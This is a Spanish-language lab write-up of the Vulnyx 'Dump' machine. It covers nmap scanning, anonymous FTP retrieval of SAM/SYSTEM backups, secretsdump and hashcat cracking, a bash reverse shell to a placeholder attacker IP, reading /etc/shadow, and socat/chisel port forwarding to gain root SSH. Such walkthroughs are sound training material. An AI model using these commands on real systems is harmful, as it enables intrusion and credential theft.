---
title: Vulnyx - Dump
author: estx
date: 2024-04-27 16:41:00 +0800
categories: [Writeup, Vulnyx, Easy]
tags: [Linux, 'Information Leakage', 'Local Port Forwarding']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Easy/Dump/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hook Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnyx.

Técnicas usadas: **Information Leakage, Local Port Forwarding**


### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.66	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```


a. Enumeramos los puertos que están abiertos.

```bash
❯ nmap -p- -sS --min-rate 5000 -Pn -n 192.168.100.66 -oG ports

PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
4200/tcp open  vrml-multi-use
MAC Address: 08:00:27:0F:5F:9B (Oracle VirtualBox virtual NIC)
```

b. Vemos las versiones de los servicios que se están ejecutando

```bash
❯ nmap -p21,80,4200 -sCV 192.168.100.66 -oN versions

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      pyftpdlib 1.5.4
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx   2 root     root         4096 Feb 09 10:46 .backup [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.100.66:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
4200/tcp open  ssl/http ShellInABox
| ssl-cert: Subject: commonName=dump
| Not valid before: 2024-02-09T11:53:57
|_Not valid after:  2044-02-04T11:53:57
|_http-title: Shell In A Box
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:0F:5F:9B (Oracle VirtualBox virtual NIC)
```

* En el servicio FTP existe un directorio .backup además de que la autenticación anónima está permitida

  ```bash
  ❯ ftp 192.168.100.66
  Name (192.168.100.66:estx): anonymous
  Password: [ENTER]
  230 Login successful.
  ftp> ls
  drwxrwxrwx   2 root     root         4096 Feb 09 10:46 .backup
  ftp> cd .backup
  ftp> ls
  -rwxrwxrwx   1 root     root        24576 Feb 09 10:35 sam.bak
  -rwxrwxrwx   1 root     root      3264512 Feb 09 10:36 system.bak
  ftp>
  ```

* Nos descargamos los archivos que encontramos en este servicio

  ```bash
  ftp> get sam.bak
  ftp> get system.bak
  ```

> El archivo **`sam`** es una base de datos con los hashes de las cuentas locales en Windows y el archivo **`system`** contiene la 'bootkey' que es la clave con la que se encripta la **sam**.
{: .prompt-info }

c. Podemos desencriptar estos hashes con **impacket-secretsdump** con el fin de extraer los hashes (NTLM) y tratar de crackearlos.

```bash
❯ impacket-secretsdump -sam sam.bak -system system.bak LOCAL

[*] Target system bootKey: 0x042145cf7279c87791fa907cd6d9bccd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:45ab968b011c0b6cfd1e9e1b30ff40cc:916da1881680fcb38f2ce951f666d6be:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:d0d506281c0dbfe0a16f57e412411d37:::
dumper:1004:ebd1b59f4f5a6843aad3b435b51404ee:7324322d85d3714068d67eccee442365:::
admin:1005:7cc48b08335cd858aad3b435b51404ee:556a8f7773e850d4cf4d789d39ddaca0:::
```

* Guardamos todos lo hashes y los crackeamos con hashcat o john

  ```bash
  hashcat -a 0 -m 1000 hashes /usr/share/wordlists/rockyou.txt

  dumper:7324322d85d3714068d67eccee442365:1dumper
  admin:556a8f7773e850d4cf4d789d39ddaca0:blabla
  ```

d. El servicio del puerto **4200** es ShellInABox, este servicio permite ejecutar una bash en el navegador, para conectarnos a este servicio tenemos que indicar el protocolo **https**

![shell.png](/assets/images/Vulnyx/Easy/Dump/01-shell.png)


### Escalada de Privilegios 💹

a. Una vez que nos autenticamos con las credenciales `dumper:1dumper` nos enviamos una reverse shell para trabajar cómodamente

```bash
# Máquina Atancante
❯ nc -lvnp 4444
```

```bash
# SHELL IN A BOX
per@dump:~$ bash -c 'bash -i >& /dev/tcp/[IP Máquina Atacante]/4444 0>&1'
```

* Ahora realizamos un tratamiento de la TTY en la reverse shell

  ```bash
  dumper@dump:~$ script /dev/null -c bash
  script /dev/null -c bash
  dumper@dump:~$ ^Z
  [1]  + 7255 suspended  nc -lvnp 4444
  ❯ stty raw -echo;fg
  [1]  + 7255 continued  nc -lvnp 4444
                                      reset xterm

  dumper@dump:~$ export TERM=xterm-256color
  dumper@dump:~$ source /etc/skel/.bashrc 
  ```

b. Con [linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240421-825f642d) buscamos formas de escalar privilegios, lo que veremos es que podemos leer el contenido del `/etc/shadow`, aquí veremos el hash del usuario root el cual crackeamos con hashcat

```bash
# Dump
dumper@dump:~$ cat /etc/shadow
root:$6$jzcdBmCLz0zF2.b/$6sok07AjDc3TN3oeI/NqrdZ6NSQly3ADW6lvs3z5q.5GDqsCypL8WtL7ARhzDcdYgukakXWeNbiIP7GyigCse/:19762:0:99999:7:::
...
------------------------------------------------------------------------
# Máquina Host
❯ hashcat -a 0 hash /usr/share/wordlists/rockyou.txt
$6$jzcdBmCLz0zF2.b/$6sok07AjDc3TN3oeI/NqrdZ6NSQly3ADW6lvs3z5q.5GDqsCypL8WtL7ARhzDcdYgukakXWeNbiIP7GyigCse/:shadow123
```

c. No podemos usar 'su' para transformarnos en **root**. Investigando más veremos que el servicio SSH se encuentra habilitado, pero, no se lo ve externamente. Usaremos **socat** o **chisel** para hacer un `Local Port Forwarding` con el fin de hacer accesible el puerto 22

* Usando [**socat**](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

  a. Descargamos socat en la Máquina Dump

  ```bash
  # Máquina Atacante
  ❯ ls
  socat  
  ❯ python -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)

  # Máquina Dump
  dumper@dump:/tmp$ wget -o- http://[IP Máquina Atancante]/socat
  ```

  b. Le damos permisos de ejecución a socat y hacemos el **Port Forwarding**

  ```bash
  dumper@dump:/tmp$ chmod +x ./socat
  dumper@dump:/tmp$ ./socat TCP-LISTEN:4444,reuseaddr,fork TCP:127.0.0.1:22
  ```

  > Con esto indicarmos que toda conexión entrante por el puerto 4444 se redirigirá al puerto 22 (SSH)
  {: .prompt-info }

  c. Ahora, nos podemos autenticar en el servicio SSH con las credenciales `root:shadow123`

  ```bash
  ❯ ssh root@192.168.100.66 -p 4444
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  root@192.168.100.66's password: 
  root@dump:~#
  ```

* Usando [**chisel**](https://github.com/jpillora/chisel/releases)

  a. Descargamos chisel en la Máquina Dump

  ```bash
  # Máquina Atacante
  ❯ ls
  chisel  
  ❯ python -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)

  # Máquina Dumper
  dumper@dump:/tmp$ wget -o- http://[IP Máquina Atancante]/chisel
  ```


  b. Primero, ejecutamos chisel en modo servidor en nuestra máquina atacante

  ```bash
  ❯ ./chisel server --reverse -p 4443
  2024/04/27 23:24:56 server: Reverse tunnelling enabled
  2024/04/27 23:24:56 server: Fingerprint 9xTeAG/cj+NT6JQBH0NOgx+P8LXbW6+vLOQoJ2bbpss=
  2024/04/27 23:24:56 server: Listening on http://0.0.0.0:4443
  ```

  b. Ahora, le damos permisos de ejecución a chisel y hacemos el **Port Forwarding** en Dump

  ```bash
  dumper@dump:/tmp$ ./chisel client [IP Máquina Atacante]:4443 R:[Puerto en nuestra máquina atacante]:127.0.0.1:22
  2024/04/27 23:27:20 client: Connecting to ws://192.168.100.55:4443
  ```

  > **`[IP Máquina Atacante]:4443`** Aquí nos conectamos al servidor levantado en nuestra máquina atacante. **`R:[Puerto en nuestra máquina atacante]:127.0.0.1:22`** con esto indicamos un puerto de nuestra máquina atacante el cual ocupará el servicio SSH de la máquina Dump
  {: .prompt-info }

  c. Ahora, nos podemos autenticar en el servicio SSH con las credenciales `root:shadow123`

  ```bash
  ❯ lsof -i:22
  COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
  chisel  11102 root    8u  IPv6  77037      0t0  TCP *:ssh (LISTEN)

  ❯ ssh root@127.0.0.1
  root@127.0.0.1's password: 
  root@dump:~#
  ```
